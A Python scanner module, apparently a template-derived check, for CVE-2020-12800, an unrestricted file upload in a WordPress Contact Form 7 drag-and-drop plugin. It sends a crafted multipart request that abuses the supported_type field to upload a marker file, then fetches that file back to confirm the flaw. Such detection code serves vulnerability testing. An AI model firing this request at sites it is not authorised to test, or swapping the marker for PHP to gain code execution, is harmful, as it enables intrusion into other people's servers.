import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''WordPress 'Drag & Drop Multiple File Upload - Contact Form 7' Plugin - Pre-auth RCE''',
        "description": '''The drag-and-drop-multiple-file-upload-contact-form-7 plugin before 1.3.3.3 for WordPress allows Unrestricted File Upload and remote code execution by setting supported_type to php% and uploading a .php% file.''',
        "severity": "critical",
        "references": [
            "https://github.com/amartinsec/CVE-2020-12800"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2020-12800",
            "cwe-id": "CWE-434"
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2020", "wordpress", "wp-plugin", "upload"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/wp-admin/admin-ajax.php"""
        method = "POST"
        data = """-----------------------------350278735926454076983690555601
Content-Disposition: form-data; name="supported_type"

txt%
-----------------------------350278735926454076983690555601
Content-Disposition: form-data; name="size_limit"

5242880
-----------------------------350278735926454076983690555601
Content-Disposition: form-data; name="action"

dnd_codedropz_upload
-----------------------------350278735926454076983690555601
Content-Disposition: form-data; name="type"

click
-----------------------------350278735926454076983690555601
Content-Disposition: form-data; name="upload-file"; filename="{{randstr}}.txt%"
Content-Type: application/x-httpd-php

CVE-2020-12800-{{randstr}}
-----------------------------350278735926454076983690555601--"""
        headers = {'Content-Type': 'multipart/form-data; boundary=---------------------------350278735926454076983690555601', 'X-Requested-With': 'XMLHttpRequest'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        path = """/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/{{randstr}}.txt"""
        method = "GET"
        data = """"""
        headers = {}
        resp1 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp1.status_code == 200) and ("""CVE-2020-12800-{{randstr}}""" in resp1.text) and ("""text/plain""" in str(resp1.headers)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url